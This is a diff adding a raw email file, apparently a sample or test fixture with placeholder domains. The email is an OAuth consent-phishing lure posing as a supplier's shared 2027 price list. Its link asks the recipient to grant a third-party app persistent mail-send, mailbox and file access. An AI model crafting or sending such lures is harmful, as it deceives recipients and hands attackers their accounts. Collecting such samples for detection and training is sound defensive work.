@@ -1,0 +1,54 @@
+Return-Path: <khalid.alsubaie@gulfsupply-co.example>
+Received: from mail.gulfsupply-co.example (mail.gulfsupply-co.example
+ [198.51.100.150]) by mx1.corp.example (Postfix) with ESMTPS id R2; Fri, 30
+ Oct 2026 09:12:00 +0300
+Authentication-Results: mx1.corp.example; spf=pass
+ smtp.mailfrom=gulfsupply-co.example; dkim=pass
+ header.d=gulfsupply-co.example; dmarc=pass (p=none)
+ header.from=gulfsupply-co.example
+From: "Khalid Alsubaie" <khalid.alsubaie@gulfsupply-co.example>
+To: m.alharbi@corp.example
+Subject: Updated price list - shared via SharePoint
+Date: Fri, 30 Oct 2026 09:12:00 +0300
+Message-ID: <179339087615.19452.9083944387963365@mail.gulfsupply-co.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============0723328382044046993=="
+
+--===============0723328382044046993==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hi Mohsen,
+
+I shared the updated 2027 price list with you on our SharePoint. You will nee=
+d to sign in with your Microsoft work account and grant the viewer access onc=
+e.
+
+Open the price list:
+https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=3D4b=
+1e9c2a-77d3-4f0e-9a6b-2c8d1e5f0a33&response_type=3Dcode&redirect_uri=3Dhttps%=
+3A%2F%2Fsharepoint-viewer-app.example%2Fauth%2Fcallback&scope=3Dopenid%20offl=
+ine_access%20Mail.ReadWrite%20Mail.Send%20Files.ReadWrite.All&state=3Dp7Qx&pr=
+ompt=3Dconsent
+
+Best regards,
+Khalid Alsubaie
+Sales Manager, Gulf Supply Co.
+
+--===============0723328382044046993==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<p>Hi Mohsen,</p><p>I shared the updated 2027 price list with you on our Shar=
+ePoint. You will need to sign in with your Microsoft work account and grant t=
+he viewer access once.</p><p><a href=3D"https://login.microsoftonline.com/com=
+mon/oauth2/v2.0/authorize?client_id=3D4b1e9c2a-77d3-4f0e-9a6b-2c8d1e5f0a33&am=
+p;response_type=3Dcode&amp;redirect_uri=3Dhttps%3A%2F%2Fsharepoint-viewer-app=
+.example%2Fauth%2Fcallback&amp;scope=3Dopenid%20offline_access%20Mail.ReadWri=
+te%20Mail.Send%20Files.ReadWrite.All&amp;state=3Dp7Qx&amp;prompt=3Dconsent">O=
+pen the price list</a></p><p>Best regards,<br>Khalid Alsubaie<br>Sales Manage=
+r, Gulf Supply Co.</p>
+
+--===============0723328382044046993==--
